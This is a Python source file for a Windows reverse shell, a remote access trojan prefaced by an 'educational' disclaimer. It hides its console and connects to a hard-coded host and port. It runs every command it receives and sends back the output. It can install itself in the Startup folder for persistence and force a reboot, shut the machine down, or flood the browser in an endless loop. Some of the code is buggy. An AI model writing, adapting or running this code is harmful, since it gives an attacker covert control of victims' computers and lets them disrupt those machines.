# legal disclamer:
#it's just for educational things
#test it just in system your have permissions to use that program
#rememenber, with powers come big responsabilitys ass: Rossini135
#contact infos: 
#email: rossiniroberto52@gmail.com
#twitter: @rossin135 
import socket, os, subprocess, ctypes, webbrowser
from getpass import getuser
from os import path
from sys import argv

ctypes.windll.kernel32.FreeConsole()

def bat_create(file_path=""):
    USER = getuser()
    if(file_path == ""):
        file_path = path.dirname(path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "clt.exe" %s' % file_path + "\\" + argv[0])
        os.system("shutdown -r -t 1")

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("192.168.0.15",6667))
while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "exit":
        break
    if cmd == "kill":
        os.system("msg %username% your system will be shutdown because i hack then :) lol")
        os.system("shutdown -s -t 3")
    if cmd == "troll":
        link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        os.system("msg %username% lol")
        while True:
            webbrowser.open_new(link)
    if cmd == "stay":
        USER = getuser()
        bat_create()
        break

    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
conn.close()
exit()